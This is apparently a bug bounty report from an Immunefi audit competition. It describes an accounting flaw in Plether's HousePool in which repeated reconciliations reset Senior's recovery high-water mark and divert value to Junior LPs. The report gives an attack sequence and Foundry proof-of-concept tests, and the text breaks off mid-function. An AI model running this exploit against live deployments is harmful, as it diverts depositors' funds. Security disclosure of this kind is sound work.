# \#99895 [SC-High] Repeated reconciliation of a partially settled recapitalization resets Senior's recovery high-water mark and lets Junior LPs redeem value that should restore Senior first

**Submitted on Nov 15th 2026 at 17:09:55 UTC by @manvi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99895
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief / Introduction

I found a way to reduce the Senior tranche's recovery high-water mark by settling the same partly funded recapitalization over more than one reconciliation.

The issue starts when the pool has suffered a terminal loss, a trader has an outstanding unpaid claim, and the owner legitimately sends USDG through `CfdEngine.recapitalizePool()`. The protocol cannot allocate all of that recapitalization immediately because part of the cash still backs the trader's claim. It correctly leaves an outstanding recapitalization balance for a later reconciliation.

The mistake is what happens on the **next** reconciliation while the same trader claim remains unpaid. The outstanding recapitalization is selected against the same distributable pool cash that already backs Senior principal. Before applying that pending amount, the normal reconciliation effectively takes the cash away from Senior again. When Senior principal temporarily reaches zero, the recapitalization bootstrap treats the outstanding *residual* as the new Senior high-water mark. This replaces the previous recovery target with a lower number even though no new loss has occurred.

That lower high-water mark determines where later revenue goes. In my matched test, the control sends the recovered value to Senior first. The extra-reconciliation path leaves Senior with a much lower recovery target and routes **49,880 USDG** into Junior principal instead. I then redeemed attacker-owned Junior shares and received **494.178527 USDG** in the attack branch, against **zero USDG** in the matched control.

I reproduced the behavior through the real `HousePool`, `TrancheVault`, and `CfdEngine` code at the audited commit. All six verification tests passed with Plether's release risk parameters, and `git diff HEAD -- packages/perps/src` was empty.

## Vulnerability Details

### 1. The remaining recapitalization is selected against all distributable assets

`HousePool._reconcile()` loads the pending claimant buckets and selects the portion considered settleable (`HousePool.sol:1559–1574`). The relevant cap is:

```solidity
// HousePool.sol:1829-1834
function _settleablePendingClaimantBuckets(
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
}
```

`capClaimantBuckets()` puts recapitalization ahead of revenue and caps it to the amount supplied by `reconcileSnapshot.distributable` (`HousePoolPendingPreviewLib.sol:68–82`). That cap is applied each time `_reconcile()` runs. It does not distinguish *newly available* value from distributable value that the previous reconciliation has already assigned to Senior.

### 2. The selected pending amount is deducted before the existing waterfall is repriced

`HousePoolReconcilePlanLib.planReconcile()` subtracts the selected pending amount before comparing distributable value against the stored Senior and Junior principals:

```solidity
// HousePoolReconcilePlanLib.sol:68-71
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
```

It then plans a normal waterfall loss or gain using the reduced amount (`HousePoolReconcilePlanLib.sol:84–105`). On the second reconciliation, that subtraction can make previously recognized Senior principal appear unsupported, even though physical cash and the trader's claim have not changed.

### 3. A temporary zero-principal state overwrites Senior's recovery target

After writing the planned waterfall state, `HousePool._reconcile()` applies the still-settleable pending bucket (`HousePool.sol:1584–1598`). If Senior and Junior principal have temporarily reached zero, `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent()` enters its bootstrap branch:

```solidity
// HousePoolPendingPreviewLib.sol:117-122
if (state.seniorSupply > 0) {
    if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
        state.waterfall.seniorPrincipal += remaining;
        state.waterfall.seniorHighWaterMark =
            recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
        remaining = 0;
    }
}
```

The target passed to this branch is `claimantIntentBuckets.recapitalizationAssets` (`HousePoolPendingPreviewLib.sol:40–49`). On the second pass, that is the **remaining pending balance**, not the original recapitalization amount or the preserved Senior recovery entitlement.

The code has therefore transformed a residual bookkeeping amount into a replacement for Senior's high-water mark. The previous HWM is not preserved.

### 4. Exact two-reconciliation example

My test uses a 100,000 USDG owner recapitalization and an outstanding 50,040 USDG trader claim after an impaired waterfall. There are still outstanding Senior and Junior shares.

**First reconciliation:**

- Pool cash: 100,000 USDG.
- Trader claims: 50,040 USDG.
- Distributable assets: 49,960 USDG.
- Senior principal is restored to 49,960 USDG.
- Senior HWM becomes 100,000 USDG.
- Pending recapitalization falls from 100,000 to 50,040 USDG.

**Second reconciliation, before any claim payment or new loss:**

- Physical cash and trader claims are unchanged.
- The 50,040 USDG pending bucket is capped again to 49,960 USDG of distributable assets.
- The planning step excludes that amount, temporarily reducing Senior principal to zero.
- The recapitalization bootstrap credits 49,960 USDG back to Senior, but **replaces the 100,000 USDG HWM with 50,040 USDG**.
- Pending recapitalization falls to just 80 USDG.

In other words, Senior ends with the **same 49,960 USDG principal** as before the second reconciliation, but its outstanding recovery protection has been cut from 100,000 USDG to 50,040 USDG. No new economic loss explains the cut.

The inherited release-configuration test records an initial pre-recap HWM of **100,066.666666 USDG** because coupon accrues during the fixture's setup. The first recap establishes the 100,000 USDG target; the second reconciliation then lowers it to 50,040 USDG. The 66.666666 USDG setup accrual is not the source of the vulnerability.

### 5. A Junior LP can trigger the second reconciliation through public settlement

`HousePool.reconcile()` itself is callable only by a configured vault, but I did not need permission to call it directly in the public-trigger test.

`HousePool.settleLpEpoch()` is public and runs `_reconcile()` **before** funding or refunding LP redemption epochs (`HousePool.sol:794–835`). With no open CFD positions, settlement can use the permissionless cached-mark route, subject to the ordinary settlement checks.

The public route I reproduced is:

1. I hold unlocked Junior shares that have survived the wipeout as zero-NAV shares.
2. I submit `TrancheVault.requestRedeem()` for my Junior shares.
3. After the request matures, I invoke `HousePool.settleLpEpoch(0, 0)`.
4. The pool calls `_reconcile()` before it processes my redemption.
5. Because the Junior redemption has zero quoted assets, the redemption phase refunds the shares rather than paying cash (`HousePool.sol:957–985`).
6. I claim the share refund through `TrancheVault.claimRedeemRefund()`, observe the cooldown, and repeat the request and public settlement.

Both refund epochs make forward progress through the real vault and pool contracts. The second settlement causes the HWM reset without an owner call to `HousePool.reconcile()`.

### 6. Subsequent revenue goes to the wrong tranche

The normal waterfall restores Senior principal up to `seniorHighWaterMark` before crediting Junior (`HousePoolWaterfallAccountingLib.sol:133–159`). Once that target is reduced, the same subsequent revenue is split differently.

I compared two branches from a common Foundry snapshot, with the same pool cash, the same claim payment and the same simulated later revenue. The extra public-reconciliation steps are the difference:

| Final accounting, USDG | Control: one reconciliation | Extra public reconciliations |
|---|---:|---:|
| Senior principal | 100,000 | 50,040 |
| Junior principal | 0 | 49,880 |
| Unassigned assets | 0 | 80 |
| Total pool equity | 100,000 | 100,000 |

The exploit does not create USDG from nothing. **It changes who has the right to withdraw the USDG already in the pool.** This is why a balance-conservation assertion alone would not catch it.

## Attack Sequence

1. I am an ordinary Junior LP with redeemable Junior shares acquired while the tranche still has value.
2. The pool suffers a terminal loss and has an unpaid trader claim. The owner subsequently performs an ordinary `recapitalizePool()` to restore the claimant waterfall; I do not control that owner-only call.
3. A first reconciliation partially applies the recapitalization and leaves a pending residual because the trader claim remains outstanding.
4. I submit and settle a matured zero-NAV Junior redemption. It is refunded in shares, but the settlement executes reconciliation first.
5. I repeat the refund-epoch settlement while the pending residual is still present. The repeated cap-and-bootstrap sequence reduces Senior's HWM.
6. When the trader claim is paid and the pool later earns or receives additional value, the waterfall restores only the lower Senior target and assigns the remaining recoverable value to Junior.
7. I submit a new Junior redemption and claim the funded USDG to my wallet.

The attacker-controlled steps are the Junior redemption requests, public epoch settlement and share-refund/redemption claims. The pre-existing deficit, genuine trader liability, owner recapitalization and later revenue are economic prerequisites, not powers granted to the attacker.

## Impact Details

### Matched control versus actual Junior wallet receipt

The matched cash test follows both branches through the real vault's `claimRedeem()` function and checks the increase in `MockSettlementToken.balanceOf(JUNIOR_ATTACKER)`.

| Measurement | Control | Extra reconciliation |
|---|---:|---:|
| Senior principal after simulated recovery | 100,000 USDG | 50,040 USDG |
| Junior principal after simulated recovery | 0 USDG | 49,880 USDG |
| My Junior shares refunded without payment | 1,000,667,111,400 raw shares | 0 |
| **USDG actually received in my wallet** | **0** | **494.178527** |

The additional **494.178527 USDG** is a measured token transfer, not merely an increase in a price quote or a hypothetical tranche NAV. It is the cash attributable to the Junior shares I own; the entire 49,880 USDG Junior accounting allocation does not belong to me.

### Real CFD claim variant

I also reproduced the replay after creating an actual deferred claim through a profitable CFD close in the Engine. The test opened and closed a LONG position through the repository's trading fixture and observed:

| Measurement | Observed |
|---|---:|
| Genuine Engine trader claim | 59,994 USDG |
| Senior HWM before replay | 100,000 USDG after recap |
| Senior HWM after public replay | 59,994 USDG |
| Genuine trader claim settled | 59,994 USDG |
| Junior principal after simulated revenue | 20,018 USDG |
| **Junior USDG received in my wallet** | **198.318073** |

This isolates the same HWM failure with a real deferred Engine liability instead of a directly injected claim.

### PoC setup boundary

To reproduce the post-wipeout state deterministically, the tests use the repository's mock USDG token to burn HousePool cash. The matched control test also sets a trader claim through the existing fixture, and the later revenue is supplied by a test-only USDG mint. The second variant creates and settles a **real CFD claim**, but still uses a test-only pool burn and simulated recovery revenue.

The tests therefore establish the HWM-accounting defect, the public trigger, the tranche-allocation difference and actual Junior cash redemption in the constructed impaired state. They do **not** independently demonstrate that an unprivileged attacker can create the complete loss-and-recovery preconditions through normal production CFD activity, nor a full net-wealth gain after all of the attacker's initial LP exposure. This boundary is part of the reproducible evidence, not an assumption hidden by the PoC.

## Relation to prior audits

I checked the related earlier findings rather than treating the whole pending-bucket area as new.

**SC Audit Studio SC-L1** documented an overstatement of `HousePool` tranche principal when pending claimant buckets were credited without being capped against liability-adjusted distributable assets. The stated fix capped pending recapitalization/revenue to the value currently settleable after MTM and deferred liabilities, leaving the remainder pending.

**Cecuro MED-12** documented a different same-batch problem: after recapitalization, the revenue continuation path could strand 15,000 USDG as unassigned assets even when live LP owners remained. That report concerned application of recapitalization and revenue in the same reconciliation.

My reproduction is the **cross-reconciliation residual problem after the cap**: the cap is present, but the pending residual is selected again against assets already backing Senior, and the zero-principal bootstrap overwrites the HWM. It requires successive reconciliations while the liability remains outstanding and produces a later Senior-to-Junior transfer followed by a funded Junior redemption. SC-L1 is the closest related finding and should be compared by underlying mechanism during triage.

This also violates the written HousePool invariant in `packages/perps/SECURITY.md:394`: **Senior impairment must be restored before Junior extracts surplus**.

## Recommended Remediation

I recommend making partial recapitalization application idempotent across reconciliations.

A pending bucket should be consumed only against distributable value that is **not already backing previously recognized claimant principal**. After one reconciliation has assigned a tranche principal claim, the next reconciliation must not withdraw the same backing merely to apply the residual bucket again. The cap, waterfall planning, and pending-bucket settlement should share a single accounting basis.

The Senior HWM should also be preserved across a temporary zero-principal state whenever Senior share ownership and its impairment protection remain live. A residual pending recapitalization amount must never replace an established Senior recovery target. A bootstrap should only establish a new target when it is genuinely initializing a new recovery state, not when prior recognized principal was temporarily removed by reconciliation planning.

I would add an invariant test that runs `_reconcile()` repeatedly with unchanged physical assets, terminal liability, marks, share supplies and pending inflows, and asserts that repeated calls cannot reduce Senior HWM or change claimant entitlements (apart from legitimate coupon accrual). This should cover zero-NAV Junior refund epochs as the public trigger and ensure preview and live accounting agree.

## References

- [Audited HousePool.sol — reconciliation and pending bucket selection](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1598)
- [HousePool.sol — selection against distributable balance](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834)
- [HousePoolReconcilePlanLib.sol — pending subtraction and loss planning](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L105)
- [HousePoolPendingPreviewLib.sol — recapitalization HWM bootstrap](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L136)
- [HousePoolWaterfallAccountingLib.sol — restore Senior before Junior](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L133-L159)
- [HousePool.sol — public settlement reconciles before refund](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L794-L835)
- [HousePool.sol — zero-value redemption share refund](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L944-L985)
- [TrancheVault.sol — share refund](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L946)
- [CfdEngine.sol — owner-funded recapitalization](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L627-L653)
- [SECURITY.md — Senior HWM protection invariant](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L386-L400)
- `audits/plether-pre-audit-report.pdf` — SC-L1, pages 32–33
- `audits/plether-ai-audit-report-2026-10-26.pdf` — Cecuro MED-12, page 33
- [Plether Immunefi scope and impact classifications](https://immunefi.com/audit-competition/plether/scope/)



## Proof of Concept

## Proof of Concept

The tests were run at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, using Foundry and Solidity 0.8.35. They import the repository's `HousePoolTestBase` and use the actual audited `HousePool`, `TrancheVault` and `CfdEngine` contracts. The release-configuration test applies the launch risk parameters through the admin path before replaying the inherited tests. No `packages/perps/src` files were changed.

The appendices below reconstruct those sources from the working test commands and subsequent corrections. For the actual submission, I will attach the exact three files from my Codespace so they match the recorded six-test log.

The three PoC source files, together, are:

- `packages/perps/test/perps/h1_audit/H1PendingRecapReplay_DiagnosticPoC.t.sol`
- `packages/perps/test/perps/h1_audit/H1FinalCashAndRealClaimPoC.t.sol`
- `packages/perps/test/perps/h1_audit/H1ReleaseParametersVerification.t.sol`

## Exact reproduction commands

```bash
cd /workspaces/audit-comp-plether
export PATH="$HOME/.foundry/bin:$PATH"
test "$(git rev-parse HEAD)" = "a82d4fefb02768e5b3bddcc97dee371eee24fea8"

cd packages/perps
forge test -j 1 --match-contract H1ReleaseParametersVerification -vv \
  2>&1 | tee ../../h1_evidence/H1_FINAL_POC.log

cd ../..
git diff --exit-code HEAD -- packages/perps/src
```

If running from a fresh checkout, place all three Solidity files shown in the appendices below in the indicated test directory first. The original six-test execution in my Codespace returned status zero, and `git diff --exit-code HEAD -- packages/perps/src` also returned zero.

## Observed Foundry results

```text
Ran 6 tests for test/perps/h1_audit/H1ReleaseParametersVerification.t.sol:H1ReleaseParametersVerification
[PASS] test_H1_ControlVersusExtraReconcileDivertsJuniorRevenue() (gas: 1516398)
[PASS] test_H1_FinalMatchedControlVersusActualJuniorCash() (gas: 3434692)
[PASS] test_H1_GenuineCfdCloseCreatesClaimBeforePublicReplay() (gas: 3695371)
[PASS] test_H1_PermissionlessRefundEpochTriggersRatchet() (gas: 2120362)
[PASS] test_H1_ReleaseConfigurationConfirmed() (gas: 42038)
[PASS] test_H1_TwoIdenticalReconcilesRatchetedSeniorHwm() (gas: 1227312)
Suite result: ok. 6 passed; 0 failed; 0 skipped
FORGE EXIT STATUS: 0
PRODUCTION DIFF STATUS: 0
```

### Selected exact output: Junior wallet payment

```text
H1_CONTROL_SENIOR_6DP 100000000000
H1_CONTROL_JUNIOR_6DP 0
H1_ATTACK_SENIOR_6DP 50040000000
H1_ATTACK_JUNIOR_6DP 49880000000
H1_CONTROL_WALLET_USDG_6DP 0
H1_ATTACK_WALLET_USDG_6DP 494178527
H1_EXTRA_ACTUAL_USDG_6DP 494178527
```

### Selected exact output: Real trader-claim variant

```text
H1_REAL_ENGINE_CLAIM_USDG_6DP 59994000000
H1_REAL_CLAIM_ORIGINAL_HWM_6DP 100066666666
H1_REAL_CLAIM_FIRST_HWM_6DP 100000000000
H1_REAL_CLAIM_SECOND_HWM_6DP 59994000000
H1_REAL_CLAIM_PAYOUT_COMPLETED 59994000000
H1_REAL_CLAIM_JUNIOR_AFTER_TEST_REVENUE_6DP 20018000000
H1_REAL_CLAIM_ACTUAL_JUNIOR_CASH_6DP 198318073
```

## What the PoC proves

The two-reconciliation and public-trigger tests establish that the HWM can be rewritten by processing the remaining recapitalization while cash and trader liabilities have not changed. The matched-branch test isolates the effect on the waterfall and verifies an additional 494.178527 USDG token transfer into my Junior wallet. The real-claim variant verifies that the pattern also occurs with a genuine deferred CFD trader liability, with 198.318073 USDG redeemed after simulated recovery. The release-configuration test confirms the behavior with the published launch risk parameters.

The PoC's controlled impairment and recovery injections are disclosed in the setup above so the financial result can be reproduced without confusing fixture-generated states with an independently established, fully natural trading exploit.

---

# Appendix A — Complete diagnostic Foundry source

**File:** `packages/perps/test/perps/h1_audit/H1PendingRecapReplay_DiagnosticPoC.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolTestBase} from "../shared/HousePoolTestBase.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Diagnostic source-level reproduction. Simulates a catastrophic LP loss
/// and a deferred trader claim using test-only MockSettlementToken and the
/// existing HousePoolTestBase._setTotalTraderClaim fixture. DOES NOT establish
/// a real-trading, production-reachable loss/claim setup or USDG theft.
contract H1PendingRecapReplayDiagnosticPoC is HousePoolTestBase {
    address internal constant JUNIOR_ATTACKER = address(0xA11CE);
    uint256 internal constant RECAP = 100_000e6;
    uint256 internal constant CLAIM = 50_040e6;
    uint256 internal constant FIRST_CREDIT = RECAP - CLAIM;

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }



    function _prepareReplayedRecap() internal {
        // Give the untrusted LP actual unlocked Junior shares while the pool is healthy.
        _fundJunior(JUNIOR_ATTACKER, 1_000e6);
        assertGt(juniorVault.balanceOf(JUNIOR_ATTACKER), 0);

        // Mock a full economic loss, as the repository's waterfall test does.
        settlementToken.burn(address(pool), pool.totalAssets());
        vm.prank(address(juniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        uint256 actualHwm = pool.seniorHighWaterMark();
        console2.log("H1_INITIAL_HWM", actualHwm);
        assertGe(actualHwm, 100_000e6);

        // Test-fixture injection: an outstanding liability, NOT a real CFD claim creation.
        _setTotalTraderClaim(CLAIM);

        // Legitimate owner-only recapitalization, real production entrypoint.
        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
        assertEq(pool.totalAssets(), RECAP);
        assertEq(pool.pendingRecapitalizationAssets(), RECAP);
    }

    function _reconcileAsTestVault() internal {
        vm.prank(address(juniorVault));
        pool.reconcile();
    }

    // Untrusted Junior LP request; anyone can invoke the pool's settlement.
    // With zero Junior NAV, the epoch is refunded rather than funded in USDG.
    // The real HousePool still reconciles BEFORE the refund branch.
    function _permissionlessZeroNavRefundCycle() internal {
        uint256 unlockedAt = juniorVault.lastDepositTime(JUNIOR_ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp <= unlockedAt) {
            vm.warp(unlockedAt + 1);
        }
        uint256 shares = juniorVault.maxRequestRedeem(JUNIOR_ATTACKER);
        assertGt(shares, 0, "attacker needs unlocked Junior shares");
        vm.prank(JUNIOR_ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(shares, JUNIOR_ATTACKER, JUNIOR_ATTACKER);
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp < maturity) {
            vm.warp(maturity);
        }
        vm.roll(block.number + 1);
        IHousePool.LpEpochSettlementResult memory settled = pool.settleLpEpoch(0, 0);
        assertGt(settled.juniorProcessedEpochs, 0, "settlement must progress via refund");
        vm.prank(JUNIOR_ATTACKER);
        uint256 returnedShares = juniorVault.claimRedeemRefund(requestId, JUNIOR_ATTACKER, JUNIOR_ATTACKER);
        assertEq(returnedShares, shares, "shares returned to Junior attacker");
    }

    function _record() internal view {
        console2.log("H1_SENIOR", pool.seniorPrincipal());
        console2.log("H1_JUNIOR", pool.juniorPrincipal());
        console2.log("H1_SENIOR_HWM", pool.seniorHighWaterMark());
        console2.log("H1_PENDING_RECAP", pool.pendingRecapitalizationAssets());
        console2.log("H1_UNASSIGNED", pool.unassignedAssets());
        console2.log("H1_POOL_CASH", pool.totalAssets());
        console2.log("H1_TRADER_CLAIM", engine.totalTraderClaimBalanceAssets());
    }

    function test_H1_TwoIdenticalReconcilesRatchetedSeniorHwm() public {
        _prepareReplayedRecap();
        _reconcileAsTestVault();
        assertEq(pool.seniorPrincipal(), FIRST_CREDIT);
        assertEq(pool.seniorHighWaterMark(), RECAP);
        assertEq(pool.pendingRecapitalizationAssets(), CLAIM);

        _reconcileAsTestVault();
        _record();
        assertEq(pool.seniorPrincipal(), FIRST_CREDIT);
        assertEq(pool.seniorHighWaterMark(), CLAIM);
        assertEq(pool.pendingRecapitalizationAssets(), 80e6);
        assertEq(pool.juniorPrincipal(), 0);
    }

    function test_H1_PermissionlessRefundEpochTriggersRatchet() public {
        _prepareReplayedRecap();
        _permissionlessZeroNavRefundCycle();
        assertEq(pool.seniorHighWaterMark(), RECAP);
        assertEq(pool.pendingRecapitalizationAssets(), CLAIM);
        _permissionlessZeroNavRefundCycle();
        _record();
        assertEq(pool.seniorHighWaterMark(), CLAIM);
        assertEq(pool.seniorPrincipal(), FIRST_CREDIT);
        assertEq(pool.pendingRecapitalizationAssets(), 80e6);
    }

    function _simulateClaimPayoutAndSubsequentRevenue() internal {
        // A test-only settlement simulation with the correct cash movement.
        // Complete production proof must instead create a genuine trader claim
        // from a profitable close and settle it with engine.settleTraderClaim.
        vm.prank(address(engine));
        pool.payOut(address(clearinghouse), CLAIM);
        _setTotalTraderClaim(0);
        assertEq(pool.totalAssets(), FIRST_CREDIT);
        // Mock subsequent legitimate revenue, keeping final physical cash equal.
        settlementToken.mint(address(pool), CLAIM);
        assertEq(pool.totalAssets(), RECAP);
        _reconcileAsTestVault();
    }

    function test_H1_ControlVersusExtraReconcileDivertsJuniorRevenue() public {
        _prepareReplayedRecap();
        uint256 initial = vm.snapshotState();
        _reconcileAsTestVault();
        _simulateClaimPayoutAndSubsequentRevenue();
        uint256 controlSenior = pool.seniorPrincipal();
        uint256 controlJunior = pool.juniorPrincipal();
        assertEq(controlSenior, RECAP);
        assertEq(controlJunior, 0);
        assertTrue(vm.revertToState(initial), "snapshot restore failed");

        _reconcileAsTestVault();
        _reconcileAsTestVault();
        _simulateClaimPayoutAndSubsequentRevenue();
        _record();
        assertEq(pool.seniorPrincipal(), 50_040e6);
        assertEq(pool.juniorPrincipal(), 49_880e6);
        assertEq(pool.unassignedAssets(), 80e6);
        assertEq(controlSenior - pool.seniorPrincipal(), 49_960e6);
        assertEq(pool.juniorPrincipal() - controlJunior, 49_880e6);
    }
}
```

# Appendix B — Complete Foundry source

**File:** `packages/perps/test/perps/h1_audit/H1FinalCashAndRealClaimPoC.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {H1PendingRecapReplayDiagnosticPoC} from "./H1PendingRecapReplay_DiagnosticPoC.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Extends the three already passing H1 diagnostic tests.
/// @dev Still NOT a full natural-trading Critical PoC: the matched cash test
/// uses the fixture's synthetic impairment, claim, and later revenue.
contract H1FinalCashAndRealClaimPoC is H1PendingRecapReplayDiagnosticPoC {
    address internal constant WINNING_TRADER_H1 = address(0xB0B001);

    function _redeemJuniorIntoWallet()
        internal
        returns (uint256 usdReceived, uint256 refundedShares)
    {
        uint256 unlock = juniorVault.lastDepositTime(JUNIOR_ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlock) vm.warp(unlock);

        uint256 shares = juniorVault.maxRequestRedeem(JUNIOR_ATTACKER);
        assertGt(shares, 0, "attacker has no unlocked shares");

        vm.prank(JUNIOR_ATTACKER);
        uint256 id = juniorVault.requestRedeem(shares, JUNIOR_ATTACKER, JUNIOR_ATTACKER);
        uint256 maturity = pool.lpEpochStart(id);
        if (block.timestamp < maturity) vm.warp(maturity);
        vm.roll(block.number + 1);

        // Positions are closed/absent: permissionless cash settlement.
        pool.settleLpEpoch(0, 0);

        uint256 claimable = juniorVault.claimableRedeemRequest(id, JUNIOR_ATTACKER);
        uint256 walletBefore = settlementToken.balanceOf(JUNIOR_ATTACKER);
        if (claimable > 0) {
            vm.prank(JUNIOR_ATTACKER);
            usdReceived = juniorVault.claimRedeem(id, claimable, JUNIOR_ATTACKER, JUNIOR_ATTACKER);
            assertEq(settlementToken.balanceOf(JUNIOR_ATTACKER) - walletBefore, usdReceived, "actual USDG receipt");
        } else {
            vm.prank(JUNIOR_ATTACKER);
            refundedShares = juniorVault.claimRedeemRefund(id, JUNIOR_ATTACKER, JUNIOR_ATTACKER);
        }
        console2.log("H1_CASH_USDG_RECEIVED_6DP", usdReceived);
        console2.log("H1_REFUNDED_JUNIOR_SHARES", refundedShares);
    }

    function test_H1_FinalMatchedControlVersusActualJuniorCash() public {
        _prepareReplayedRecap();
        uint256 snapshot = vm.snapshotState();

        // CONTROL: single reconciliation, same simulated claim payment/revenue.
        _reconcileAsTestVault();
        _simulateClaimPayoutAndSubsequentRevenue();
        uint256 controlSenior = pool.seniorPrincipal();
        uint256 controlJunior = pool.juniorPrincipal();
        (uint256 controlPaid, uint256 controlRefund) = _redeemJuniorIntoWallet();
        assertEq(controlJunior, 0, "control unexpectedly allocated Junior revenue");
        assertEq(controlPaid, 0, "control must not receive cash from zero NAV");
        assertGt(controlRefund, 0, "control should receive worthless shares back");

        assertTrue(vm.revertToState(snapshot), "failed to restore same initial state");

        // ATTACK: same cash and synthetic claims/revenue, but public replay first.
        _permissionlessZeroNavRefundCycle();
        _permissionlessZeroNavRefundCycle();
        _simulateClaimPayoutAndSubsequentRevenue();
        uint256 attackSenior = pool.seniorPrincipal();
        uint256 attackJunior = pool.juniorPrincipal();
        assertEq(attackSenior, 50_040e6);
        assertEq(attackJunior, 49_880e6);
        (uint256 attackPaid, uint256 attackRefund) = _redeemJuniorIntoWallet();

        console2.log("H1_CONTROL_SENIOR_6DP", controlSenior);
        console2.log("H1_CONTROL_JUNIOR_6DP", controlJunior);
        console2.log("H1_ATTACK_SENIOR_6DP", attackSenior);
        console2.log("H1_ATTACK_JUNIOR_6DP", attackJunior);
        console2.log("H1_CONTROL_WALLET_USDG_6DP", controlPaid);
        console2.log("H1_ATTACK_WALLET_USDG_6DP", attackPaid);
        console2.log("H1_EXTRA_ACTUAL_USDG_6DP", attackPaid - controlPaid);
        assertEq(attackRefund, 0, "attack should fund redemption rather than refund");
        assertGt(attackPaid, controlPaid, "no additional actual USDG claimable to attacker");
    }

    function test_H1_GenuineCfdCloseCreatesClaimBeforePublicReplay() public {
        // This variant uses a real profitable CFD close and actual Engine claim,
        // but still uses a MOCK USDG burn to force the catastrophic pool loss.
        _fundJunior(JUNIOR_ATTACKER, 1_000e6);
        _fundTrader(WINNING_TRADER_H1, 20_000e6);
        _open(WINNING_TRADER_H1, CfdTypes.Side.LONG, 75_000e18, 12_000e6, 1e8);

        settlementToken.burn(address(pool), pool.totalAssets());
        _close(WINNING_TRADER_H1, CfdTypes.Side.LONG, 75_000e18, 20_000_000);

        uint256 realClaim = engine.traderClaimBalanceAssets(WINNING_TRADER_H1);
        console2.log("H1_REAL_ENGINE_CLAIM_USDG_6DP", realClaim);
        assertEq(realClaim, engine.totalTraderClaimBalanceAssets());
        assertGt(realClaim, RECAP / 2, "claim must exceed half the recap to exercise H1");
        assertLt(realClaim, RECAP, "claim must remain less than recap");

        _reconcileAsTestVault();
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        uint256 originalHwm = pool.seniorHighWaterMark();

        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);

        _permissionlessZeroNavRefundCycle();
        uint256 hwmAfterFirst = pool.seniorHighWaterMark();
        _permissionlessZeroNavRefundCycle();
        uint256 hwmAfterSecond = pool.seniorHighWaterMark();
        console2.log("H1_REAL_CLAIM_ORIGINAL_HWM_6DP", originalHwm);
        console2.log("H1_REAL_CLAIM_FIRST_HWM_6DP", hwmAfterFirst);
        console2.log("H1_REAL_CLAIM_SECOND_HWM_6DP", hwmAfterSecond);
        assertLt(hwmAfterSecond, hwmAfterFirst, "real-claim HWM not ratcheted");

        vm.prank(WINNING_TRADER_H1);
        engine.settleTraderClaim(WINNING_TRADER_H1);
        assertEq(engine.traderClaimBalanceAssets(WINNING_TRADER_H1), 0);
        console2.log("H1_REAL_CLAIM_PAYOUT_COMPLETED", realClaim);

        // This part remains a TEST-ONLY revenue injection, not real trading fees.
        // It checks whether the real-claim replay can also result in a real
        // attacker-owned Junior vault redemption.
        settlementToken.mint(address(pool), realClaim);
        _reconcileAsTestVault();
